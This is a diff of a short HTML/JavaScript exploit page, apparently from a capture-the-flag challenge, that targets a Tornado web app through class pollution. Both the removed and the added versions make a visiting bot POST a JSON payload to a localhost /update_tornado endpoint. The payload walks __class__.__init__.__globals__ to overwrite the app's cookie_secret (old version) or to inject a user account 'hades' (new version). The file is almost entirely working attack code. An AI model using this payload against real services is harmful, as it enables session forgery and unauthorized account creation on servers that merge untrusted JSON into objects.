@@ -1,33 +1,23 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Exploit</title>
-</head>
-<body>
-    <script>
-        const payload = {
-            "machine_id": "host-1094",
-            "__class__": {
-                "__init__": {
-                    "__globals__": {
-                        "APP": {
-                            "settings": {
-                                "cookie_secret": "haha"
-                            }
-                        }
-                    }
+<script>
+    let firstMachine = 'host-2541';
+    let json = {
+        "machine_id": firstMachine,
+        "status": "okbAby",
+        "__class__": {
+            "__init__": {
+                "__globals__": {
+                    "USERS": [{ "username": "hades", "password": "hades1234" }]
                 }
             }
-        };
+        }
+    };
 
-        // Bắt bot gửi POST request đến localhost của chính nó
-        fetch("http://127.0.0.1/update_tornado", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify(payload)
-        });
-    </script>
-</body>
-</html>
+    fetch("http://127.0.0.1:1337/update_tornado", {
+        method: "POST",
+        mode: "cors",
+        body: JSON.stringify(json)
+    })
+        .then(res => res.text())
+        .then(data => console.log("Server response:", data))
+        .catch(err => console.error("Error:", err));
+</script>
